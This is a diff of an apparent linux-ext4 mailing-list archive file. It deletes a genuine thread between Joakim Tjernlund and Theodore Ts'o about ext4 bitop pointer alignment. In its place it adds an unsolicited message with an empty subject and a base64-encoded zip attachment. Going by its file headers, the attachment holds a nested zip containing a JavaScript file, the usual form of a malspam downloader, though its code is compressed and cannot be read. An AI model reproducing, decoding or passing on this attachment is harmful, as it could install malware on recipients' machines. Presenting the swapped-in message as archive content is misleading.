@@ -1,83 +1,145 @@
-From: Joakim Tjernlund <Joakim.Tjernlund@infinera.com>
-Subject: Re: [EXTERNAL]Re: ext4 build errors
-Date: Mon, 2 Oct 2017 17:27:12 +0000
-Message-ID: <1506965229.24473.9.camel@infinera.com>
-References: <1506954181.985.9.camel@infinera.com>
-         <20171002145517.652p7p7q4vv5rqcc@thunk.org>
-         <1506957332.985.22.camel@infinera.com>
-         <20171002165408.fhgsykuwautesn4v@thunk.org>
+From: <nbensoncole81@yahoo.com.hk>
+Subject: (unknown)
+Date: Mon, 02 Oct 2017 17:38:27 -0000
+Message-ID: <150696590771.18525.8904304931222088530@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="iso-8859-15"
-Content-Transfer-Encoding: quoted-printable
-Cc: "linux-ext4@vger.kernel.org" <linux-ext4@vger.kernel.org>
-To: "tytso@mit.edu" <tytso@mit.edu>
+Content-Type: application/zip; name="3533773208567.zip"
+Content-Transfer-Encoding: base64
+To: <linux-ext4@vger.kernel.org>
 Return-path: <linux-ext4-owner@vger.kernel.org>
-Received: from mail-co1nam03on0046.outbound.protection.outlook.com ([104.47.40.46]:6580
-        "EHLO NAM03-CO1-obe.outbound.protection.outlook.com"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1751085AbdJBR1Q (ORCPT <rfc822;linux-ext4@vger.kernel.org>);
-        Mon, 2 Oct 2017 13:27:16 -0400
-In-Reply-To: <20171002165408.fhgsykuwautesn4v@thunk.org>
-Content-Language: en-US
-Content-ID: <F6729A626BD3B243B925D3C3BFD8CA2D@infinera.com>
+Received: from 114-25-120-179.dynamic-ip.hinet.net ([114.25.120.179]:46286
+        "HELO hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751195AbdJBRik (ORCPT
+        <rfc822;linux-ext4@vger.kernel.org>); Mon, 2 Oct 2017 13:38:40 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-ext4-owner@vger.kernel.org
 List-ID: <linux-ext4.vger.kernel.org>
 
-On Mon, 2017-10-02 at 12:54 -0400, Theodore Ts'o wrote:
-> On Mon, Oct 02, 2017 at 03:15:33PM +0000, Joakim Tjernlund wrote:
-> > > I believe the reason why the standard bitop functions are made long *
-> > > aligned is that on some BE architectures --- I suspect it was PowerPC
-> > > but I'm not 100% sure about that --- the native bitop functions
-> > > required a long * alignment.  Fortunately all of the little endian
-> > > architectures didn't have these alignment restrictions, so we could
-> > > keep the __set_bit_le functions to not have any long alignment
-> > > restrictions.
-> >=20
-> > If this is a special case for ext4, can you not just do an explicit
-> > type cast in ext4 code?
->=20
-> Sure, it would be safe *today*, but then in the future someone might
-> change an implementation of the bitop_le* functions for some
-> architecture which would not tolerate unaligned pointers (since using
-> a long * would imply this is allowed), and then things would break.
-
-I guess I am missing something, the __set_bit_le calls __set_bit(nr ^ BITOP=
-_LE_SWIZZLE, addr):
-static inline void __set_bit_le(int nr, void *addr)
-{
-	__set_bit(nr ^ BITOP_LE_SWIZZLE, addr);
-}
-
-and __set_bit assumes it is working on a long, why is is safe in __set_bit_=
-le to cast
-the void * into a long * but not in ext4 code?
-
->=20
-> > > The fact that bitop and the bitop_le functions are not the same
-> > > is... inelegant, but if it represents a practical optimization that i=
-s
-> > > possible on LE systems but not on BE systems (where bitop_le gets ope=
-n
-> > > coded in C, in an inefficient way, but oh, well, BE systems aren't fo=
-r
-> > > the cool kids anyway :-), I have to ask whether it's really worth it
-> > > to do the cleanup.
-> >=20
-> > I see, but by using void * you also loose type checking w.r.t size so
-> > if you by mistake use an u32, you will not notice.
->=20
-> Um, we're never using a u32.  We're using a pointer into a bit array
-> which is often far larger than 32 or 64 bits.  For example, when we
-> use a 4k block size, then bh->b_data is a bit array which is 4096*8 =3D=
-=3D
-> 32,768 bits.
->=20
-> This is why void * is the right thing --- it's not a u32 or a long.
-> It's a bit array.  And in the case of the mb buddy bitmap, it's not
-> necessarily going to start on a a byte boundary which is a multiple of
-> 4 or 8.
-
-For ext4 it might be right but I was using "you" in a wider scope,
-the rest of kernel src.
-
- Jocke=
+UEsDBAoAAAAAAF2LQktDo8EwhhsAAIYbAAAGAAAAODQuemlwUEsDBBQAAAAIAF2LQkvjuYl79hoA
+AC+6AAAFAAAAODQuanO9XVlTM0UUfbfK/xCxKoLtFid+wqc+dDYIELaE1fKBkIUEsm+A+t8dcJlz
+mXs9M7i8UJ2hp5e79+2e019+6Xf3hvVpsTHarsyOrm8Ou4WT2mJ/eXw4OKuVt69vr8YXi+5p/246
+2q+UGo8Pl/Pl06py2vCtXndvevhQLw8m94X58fLiYKdaGzbPB3edw9s93xvWd0rbp/uNq257uOy0
+Bg+rfq/avq03ro+nZ8Wdp9n9tHjbuuqU72p7u5N6d9W4OVg8VHbuZ739y6Pty/H+vPF4t3N+Pyyd
+VmcP073j3fZZf3BTftorntyNDnfG/uB4cn97Wm9dLy56u5ftauPEF67bpf3pZHm/fTR4OK9cFrtX
+frd/MioPu4fzyeKi2H7qHFTPpoVJZXxxUhvutqrz2aJ5fnW2N6p3bhulnePKxer8cjlvnzV7w/J4
++/Tw5On6vlXpnTeX08PSw8Hqtt2oXdQn5ebZ/fSmN+p0L1v9q3FtNdyZH9bvKh9+cLqa7TZvapfj
+43nxojPtZ37IrH9SmbXOL1cn9Wl5FhUL5fPox2lU7EfFs3ZUvoyKpUlUvo2K21GxFRUXUTHzA5Sj
+4jAqtlfw3N/Mox+9JdSKihdR8bAJc2jfRD/m61F5TSXFLbR9fx/9+CIqXo/H0Q+o0ouKN34Ov0bq
+BNc2ovJ3khpx0m3DnCcqg45USrQ7MPmoWIyK06hYuyyr4/ghI/ii1vEw+aiYjmtRUfBPb3l9DQZS
+V+tMVd6MoZEvVBnYgS7379NwDOT+TpWprjqk5XVUrkLfRZjWblQ+UFVqrjIDWXqljplrYlRE3kMn
+pnZeIE/7apNcOw3mAv2OGipZh9vA305vH3qdPUJZpWF5AJJZsKQQhonCkekAi4aGQoyGQM0nVb+n
+D1H5XGVDAzoCQpXKNy9TjOvTDhgy1aSvHwIJB6qtKS470JUUsLgmnN41VF14VC3dzWIDxPBnVTin
+qiTNF9MhVKrPUViA1t0vOtDASJ1s8VYl0xRqjFqxUcTJJ4mWgFQqZ28fJYF04/MrlDuLV6ocF90e
+uqWMah9LK5DKo56qkk11Ih1VtGpAv6erYyCatH9x31qAF6PiwwGQF9o+hnleqITY96ocbmRSCVxU
+DEUPXjTcgGH8QdKq+zAhlW27aPzn3jDvX1SkgMcJ+kp44/MsP/R0EzkzmIUsegBnhbHGsTqnC2QM
+eDFgDPW8v0ZFQw0MM0zjNDQpXbXGCPT6UJWrwmlUrviiyrPW09HeOtCwCS2h899WPUX95AG6g3Hu
+qSHicOezjOpaasCWlqrPPbXBwh1o/AqGuxgU94F7b7bt8RpxNsUtRFNlhx5LIWHBwJ2AvVENkkHs
+4c4XIO2GPymOdJX0qqyuU5ZBawlYJhmF7m9f+BhduQYVmAjMvAs6vPN4BrawD6RsH6lyfE4j0zUP
+M3MwA6+y3Q1UK7IEwnfmkgnxRiYeakPZQdsfw4/uEup4ncdOHflCDbjG0EQ20N/MvRpXXHMfBeVa
+Lhv9CqLiFrx8VlfFLAvV30dFfQBZ9WmQY5U3VVeYVbsLfI527vUey0iG3CvSxpV9BiS81fsJoGw0
+mIXHeRwMDFHSLWo957AhJk+BWmFbJxZtYivr3uGrKOW9hS7GDrR7Toeeh0FijbxauwDNwcBKSEZk
+ByWGxwZLleSiHbhtqC3E4T2T3jxlDMyt2NQZFuhi9HNWl7ScoaHeBWXsQB8mPH1vCNCmoCp08S4m
+ZXFuv1PJUDL0zRl0fQdPhUjgCJwuHxUcjt4k0Juqk95JsZJckY3JZAMcsz7Somum6ChgFco/UyF1
+Xlg7lIWiYQVxAMx3pJGOmA2JSy3U2dS1yGPtwDv0lvg6koDza1sf5yadnnf5AlRC+payVGSct3xL
+XozImIz6tKjP8GtBt1feLZqvzot3ZZ2jKAkFwRn4h2CwbsPcdooJ4qy+4ePSH2OHfRoiwViLngcG
+OSOMQKOvRzeMDH29QpdqZw51HcOIqDjTKdWhDLnVtVM4RDUe0XdEHNTNWtEwVK+7msES3ZS+r6Sw
+wJ7yLKv75TLrJe9pFRG+LlRO4eqmE5e1+NxT6Nmzec0ZarVZ5K/DYwz4qbPGyrpyPOh7LT2M9lDK
+xTTyYuphXMUUZoQrTqeOgi8EsGlU8xaSiS0+/UrP5uptHMHTGzUPimtpeNoKeyerPEN6tvSFbKAT
+Tedii81rBrSZAMl81ghMhIx0BtGvAY8RnQ+yleRmxFP/Ya0UcpgJpR4JeWHkIHBUeR5MUXsQMEs4
+6qiPH6xlmrE4L7ScKf2XQqY9iDJNuWC+Z2FI9ZY+UswjzHU69Vj3+msDtSgETs2C+Yna8kQ31oN+
+q4kkHY9ED8mXHhb7oPzev1UvUHifVy1ZVd5oWshNVIot4MWerl08EYYxa9lRIrqcbvfmKDiculGx
+AuXGpNMCnnqUjgF0JqLesTrDgT76tu/Az5laaW543C3DN4Z1ki9v9VBxOFFH3qSBZdbo2wuT7I1o
+iXnEFLmEQPTOE2d6e+90BSxxsdQX+Do7ip6mVnXmGbYUaxw0/UJtpmcs9yoz4Deb26iNVB6DABmu
+TujfFtRJFUxjKylWdkjbWIo1HnH4PP6C+vyxEarmBRVTbCrkjbYDw0Hg/AXJi9k8o9J7mrJ6712C
+nJOxSsT+sc5myUiAC58lNOg9kwjH0zfM0ARSMHF/icYgOChqJrLCURu+Tl/O5ljbmDeqqmdfnf70
+2AhexbqPrss8TE1MmbMqh8ZGrgwFpcUyXjUJLbbwW3lc+NGRHamHO/xdB9dWC54SMiQXnh40oMVL
+dTO/ZgQjCXTQclRsEXwAbdRU8fK2pMUrHEMNThJ9htRfuveGvjF25HyDRU+OhXEd1a8OrW1IGaob
+tfJl5FnOWCc+iEoFXKXpE+iv1GGLlaEq/k6Iv5B+b4WuwisHxsq9gHksGEbZSspDow19knrc7Tqu
+yaq7IZTTJW+QwaEze09dgeG2cjTXgAaxAK1UT+E/WEazT/0ZegCg9ZFxiEQPHunAjbSB4UsDtwOD
+OrX8Q0CXzKh7JSt9hQtPO2ueRUKVuJmJyl0UQz9QV1udGEfi0RxNoOaLwnL46ilIBQYAz4l6dC6N
+jp6igirtv2Fx/LQF39BybH++6Ohqy0h997v4C5uRWW66tMApVdHFWYGVHnhWGnqq+vUg41kYvcZS
+XyrMKaGN3D3nSqh26j/+7D+uUzndBgbUNBrBozEA7CbAV/lCzBgsPb3lcsJmF1zolWiIOUuR8NSd
+1tDSBujwSKcjZj9pjtWNDCJtWW9Gw0qzV5hHVX997CnOXaFChr/XYzWdskO6WY67sLpzfYLKhrcU
+DYb7g3RBXnZ8Q4zJc959rT43YpGQ5Nhkw+t7p500EkoD4Qq8eMEiuX4K84mO1MqwVlFLX/nIxPuS
+FV3y6lDWlW2OsjJGzTOS3p2i+pFLG+WPLqOMtBAqZFEYrz/saTwvQdMVIqGB2w4NlY8znWJNM0yn
+u3kVlaOC1vrRzv7CO36OmR6XyVWSRzzcUpo7lnmRUKIqHwaH9ACO44tjz6yDb+o2IRbWxu1sA991
+6neDdC1yClzzxmHZvpFkGeiNe7rvveUmWJ96c7qO7XnDK5XEVoy1CZdH+aH5GM8dd76od4RyJ/8h
+NJ8nXWiEZEiVyDNUSpKX8QbHOlvnhi8Rixp+Qkqsq/nSXyd1mjRYDgfeS2CjQNf0vaQOUJCGtQPd
+/D7iYOnxgiXIA41UDRu2Bd1YO9o9ftjZ0x1F67wZjlDICQ2KsHt+Qr6UZDdOrItpt8aU6NkkGiG5
+UmifLOIFYxz+RBeYkTzhT3deAiOLUgp1l6cQmAf9Wnw+xA81GptTgj/GSWqeCcTThfxDJH6gSbc0
+z0dLssbpW2fsoLmWlXExwnHBZNxe61WSH3mgFSZUoTHjUTBOvhsqtz3HqGOo2rxbdQD36tM7mhsa
+QVHkF+mWi8fjxTTzMtYXuTSm0E+PN3UJbg/1kfb1xyMZHE3oqQg/gRfoV0vNSoozWdanUfoXLXLX
+W7hmoSrvrV35Ij0nAtoqFJQd+MsGW9Qy0NNvtai4e6hPYd84/5wP+P5EINysON4QLl8NT4cEefTu
+eVsr8deeYh/Ib7E3g8CHFEic1dx1Hoi0L+J3lDF+zpKeqOHLf/BbxpaG8W3DIw3xOG23HM2iCw+O
+ZN5FLZL0jJ7jTOkHMfwYWiX5pr+nx1zoQsE/f1yAXriD6txhI2+9ehxp0BafiD4pnfyHat194WPf
+8bgy1Ufa2Hbx4+jHp2rx+6i4piNz3Om53queehSldsSQSUqqQB5fVtX9nKHqeBcp8K/WcF6ZxgEw
+6gr4c37Xv76vqhmWfXVkZ5kfEiC89Q00N/2wqYHmpoOAfaEiW7S7+mMVtaKl43TtRMW9fXUcaw5h
+rqbqOeXzlZ7erJe02PsfwFypUfTXG6Aea7MRQkOsdAiPNpBAzE/lyoMB47Ww5qemdow540yt+TmV
+dwMdxlCdwgiGZKBorEEvb0Y2Q+arhiAdcd4oECp6CBJxpWPPqUo+gpnO1tT2niZCWnSoN04aXYIe
+kSAGGfjk125eofHEi22VEvNlW609SwHHJLRN17F0olVCWqEYNVOJjEUrSZP4CHUs0ZFO1alKh3TK
+ZtLhX1anLa46Bu6qpEi8iOiKIwPTbDoz3c6DJAFXoFTE4BbFMME3MKnXX2jFFWKsG+y5aiOmQFI0
+OxvfZVQCV1XvvbcEOvROox8XMMYdhgx4pQYaJZUOwycRLQGn0gGxhfBr+tmoK1V4no5g0sBEGQWq
+XZ3raFfXNpnjcSNGi5+pwWkOWfjJxhfT9vj++qa9ftLulh/G68Dhtc8ya921jfDvWsjs9vL6fn1t
+eb3mPvxgbZp56F92io2r8aLXrJ7US9t+9cMn3fa83r4ZDVuzT77LPNcLq08zi56vjk6vLh5PDs7L
+e+OQK8MQn7l0PW+/VFnf+DHe1k/rG3+0cF6/mfbG8y/q979Xb4/Xc1999VX477+GUm2Xzv2oVSs0
+O9PH4i10ELb9Ukd08PLkr17CqX34Qa+TWV9/3czn8ZH/kMl99e03wZcvfzd++WX9dY3PXw/m+Z38
+5mbu3bsvN7/+Nr8RgkRmju/6l4Xz61O/XRoPrlY7J91wyK8Bt7/L/JqpXc1uj5YH1eHJ5L71dOz3
+d8phzRdGxNt4nkdnNM2sd3YfryvNRrU/Oz1a1K4Ge+E7X32XiT/+PjOoTPe6+yHO2l0/xFSbnH9x
+3x5257dKZeeeR1556O9vHx/M2oPDoi9dHt02wrbr3eGodPisJ7549QJE+LrZz+LtbWQ+f6Hlu6/D
+wjNlPr2v1vaWoWm4GOw0t69OSjfDpy/z325tbn2dcX9U/ZNT49IqRBStN7c7l7VpiAW63jgIF1a/
+L6dW+8uzjWeqz6eL9kYmm82sK6P+6JmT+VxuU+02lw++3fz6717+5uuvvn23aYw5t5V/9/JyfKDK
+Cy+D7Vzfz9ovwnF36q96hdpRKwSBD1eoy+F4kXE/ZJ5eXM9zpP+8amnuXF9qQ9sIpebXzLPStUfj
+zk6vUrg8L10dzw+eTpqTP0VH6eFZdr788vm901Wjt1std24P985ay/HscSd8zQB+1xyeAIPvqwd5
+DTB4Nfi4TQAGj8DTFsD4DUKqYyBpgkzrgJ8cAh7aFhDwYMXHanFfd8rwXuNtke6GARBvwcInAIPH
+pMGrVEHEl1SA4BQMXvAPxmXyD7kG1DivgwsXOOAGtPttVP7/od3By3N0Xx3kfa5/7oTYvxKuPwFk
+OwPD/Qcw7rqu1dXKJ9WjeXUItPuio8MLt1VdpTDubYRxVw1fmvkYcO8pgbdB8YeZVGs3CgGP67kk
+C5fXy5U4pXoSwzwqcwj406hs4JqnhYCfti0g4Ex9rv6jN+ziJQDT0aAI/WMezwZ0h9YMPPyoKJDx
+r8BocGJERQn3TlGwf4WykD80oFLqxirzVhPVlvYMuPfOpbpOlCDvFlr4k5oNOWB3lPwbCOIoXJmp
+gTKdCNDdgHGPiobxN0y+aeivvqgYMO6YEiqrJO3phhGerlfvdXz9JDDuF8N9fTtTGMhfMWeT1kSG
+qxM1VkoCu55ktS9h1x//DXRwCxNcTZR8FhX/DVB24OXdJSg3u0BG4H9TxVGfojIZqaj/DLIdXB8y
+pdDde4ZivzGsvmpvRqhgfr6OrEjAAJAD1W68lSlgS7hPeEkMyOg0/vKOSmsLsj0qCvD2c+NarzXc
+aTdOoScBagcqpwNqx4ML0OLH0GcXOhJHo1p4YkLCWJkA7PBUHupLfuq+RU8S4OEZYFS9Zr8YP2kp
+T0nlXJoP96xP8kXz4mMIHXHxjUhbAoBdnG/yKRrMIp5KSgB22k3WUcgiMFwcnCLYyhrH4OhnVKqB
+WviFm8x9NgnsusMTnOogSvQMY4i06zy+XEpw+FrAqUMtfrovb5wufVdsGmetnYRJpxCiL9gNKVBX
+DRB1/kn3JmuuYuFvb1siU+InxMqvqsRbSXXAn4KAeQlc7vFTmAQg6kJr/ng7DkpmAboX4XEzAbgP
+A4D/WWeqYA49Rb6JB9jot2+BBfnCIdGhPQosZkCUl/l5U+840IkgEEWIeDN0OiVDwQApZ829ozpB
+P6B3nhpkT+9RoN9IITw7tQWG696s6CQVkO1U70NSJ4c70QE8snlGhO0EX/q88STrvwPtHhUT4FSB
+P/oH0O59bLJLP8vKSaQuE7Ldu1vzs4movDAA2BccJeEMynUo19L4oFTwCvRTqVwKGc7TQEGX5jL/
+zA6GwSHbgWc03KXIk9SqITUpDQ2jsWnoC9VRPX7DcoLbnx7mzyDvLuAfh5fTLQgMuHecoYB7pyzK
+MdVHKD4O/B4V3wwBHxVv7oxL1Ax8tFTYYVvZVMDv6eDeo+Jk4Y2L2CqhjES/BNw76hj/FJmf4KdC
+L4Hf6QebAgI+XNpQC8MNnQwKneE/c57D88kPLYw73AoG4LqAcY/KuG9xZAO6d9KCt9PPuuaV5It0
+fhnKYKD3bYG3G+A6Tr+uuNWspLmUEIWGIyUIGPf39IYTl6epKJrxCeXQqIOWkn7+HhX/FWh3X05w
+VV2O2jNdmMRHkjagO/BcN/4C5N3Rq43GKFHQDEXBQxOQBPh9i1+uGFAnggDuQ2C/BfKO0O70qzb6
+ZTj9tJDHVMWUcO88iSeSMTSdENB1npDDojc9ewLw9qh4gFJJ1dJRUzlrekSOautcHA9pKIJDN6A1
+5DfK1FoWOA6FuE+UZ0jxeR6r5+mdGnS1kgrGPSqmgY0PJLQ7RZ10RQHr5gUSO+1YfFPrDMI5cdvN
+Kxh3fMm/hmx/M1C7+KLbMHrp4NmpafPOBGV3OY5c5izYdaeXj60tGOzM00V8nu7vWKEJOnB65ZB7
+4LQUGMT6Eqi/0l3ipRAJA2xd3W/utAzPx5xTuKrCn+pedQIodifxGSjQQyBMNC43D6CWAbF+qusQ
+PD6mbsElgFMXJsiAETbAUTH8oigsAtavOYx+8e1Jn2R/UlcOAR9q5Cai4oPxIl6vlQK/rR8V08Gu
+Q/muQxMMhs7TLGSWQ4sFbJmaDLI9UgJdeNIgC3K8XEEFCvEqzLGnIa3QNCPkyRseO0exlp4B3dGf
+vFb8+KwsQHcB4y7A25FqqYDao+IWv6hGlxwB487jnYAmVIM37uWKuwPx/ImVmQ8JWhJmUN95aNKb
+6hDknRI6Hdw7RjT0vkEUM3lbR2LkGP3YhgCS1zOlo/B2tKwlT+9dmii9WEmxdqHJlT4yNcUuARX8
+HIfk2kpx1QoURZgppCgqJwCcb9IaUXEJjxMAztMrYhNc8evFFbR8q5Ei2ycAoac7MVQNc2mUiS/a
+JDC9CUcPz8VludzjIl1nNIWLZx6H1naCOqkjHMuEZ4jdiGo56BG94iR4XuZat0wII59GhWY6qcNb
+Z4ZypVxBV54WNB5ZxG9q4IhmQY5fT5MKPj4Fp3RznARwnsPMS3D5C8zIGvDxKIZ8C99X8cfpKV3s
+//tQ8biS16tjM8VxO/rxxJ1XmFzitzOIBTGFwtXtJVYoZ+n5j8YizXVcAjSe56C9ARWv41/O9Rgi
+dk1LdOKaxlHiRog0Jy68QX2keZ5uy1iLGAq4nAQ03vmZgIVPBAavKc3r9uNGYUVV6XTst2kMKOQb
+weATHGbYEnDGyWPJVADxPQrQ7OgZPuHw+JE0vilqwccjaLx56AsHmepcmLc8CNp1BI2nZvrNQPIw
+qDlLXGTp3ZEh0CXdzPB5oaMuzZrc5+Z0CzjwVBOxjfDYSHKBH7AD4Y+sMQPCdYm2p+Oe8S3V1ydN
+vu1GhUVcLMcxcnM8aV95G2i8yI9KqHixWEp39ZkXWWWeuKH0cqU0MSFtLhjj5Ca6+R/R9amjd7kY
+KamgxM9rGumArA0pjwzgQPJGV1m/WeYnU6LiJl0+iFPzPku/InPprgViJvMR3W8KgGEOPQ/jpKIS
+BD1nxDkccF58toVzR6WgX1npNeaqU/JDDj3v7sRNNaMRBleex4AVGq/AUw4kT9N52wI+XoDGG/Gc
+p3eUBhXMTPScn9jRcZw5TX4lvXU7hJOw8I4eTKFCLg5N0EP72RBSWuBIU+xujFw8/74p+Adg8FHZ
+goUXmkkl5z2/xb8ovF+Ofgdr0MvxTKiuIAKL23Dw1jXhu3qTBrh8JflBmDw92ZQGFZ2D0MudZ+O0
+B/LDEFpH97F4boDf5o0C7p1Od09PDX3Dt7o4kR09yJSNL/DjAUL8w+i4N04AOG+liRwXd4flGgeX
+V8mREnA+KnLoeexFN6wff2oAzieBmVdXIwUQtCME+ykhpLz6oUMVweX/DUj5qCjB5aNiOoDRdCD0
+OmKDBUw/UYOCI4EsN9eBe2pAQw5CHxW7eoXrFsPx29lTJ1+jwMkcSjoBNvl/iBpswEtDLwKL3QCr
+B1pytHYLekzCRptQ49b8DLh9A5gegRSnMEVj4lFxTlnOsfp1lDUDMvq/ZLlbW6UCl9fxnpNcvwCN
+/AuA80CQf4MMKh+TwNGnBKGngJxvF6MQ/jUdra4vLZh5XWN0OZm/mnS8RnuueoKZDuk01zvsJrrV
+gCIaphI3k3ASjT7UoZtreE3Hnn8rj6NiuisbUsoCv4aAWtQxKN/8Fvo03UBMgKNfr+5fSTDANIqt
+mrneNAVg52j6mAbkFcHZa3vRj6XEu1eT8DtvxbsfAtlpEPlPsPD+KlfYkTADKU/9xHcP+Azyrge1
+v0N8R78xbH2G/Y5+fWbi3X/3G1BLAQI/ABQAAAAIAF2LQkvjuYl79hoAAC+6AAAFACQAAAAAAAAA
+IAAAAAAAAAA4NC5qcwoAIAAAAAAAAQAYAOwKhFHeO9MB7AqEUd470wGiOg9R3jvTAVBLBQYAAAAA
+AQABAFcAAAAZGwAAAABQSwECPwAKAAAAAABdi0JLQ6PBMIYbAACGGwAABgAkAAAAAAAAACAAAAAA
+AAAAODQuemlwCgAgAAAAAAABABgAZjGLUd470wH8zohR3jvTATSZEVHeO9MBUEsFBgAAAAABAAEA
+WAAAAKobAAAAAA==
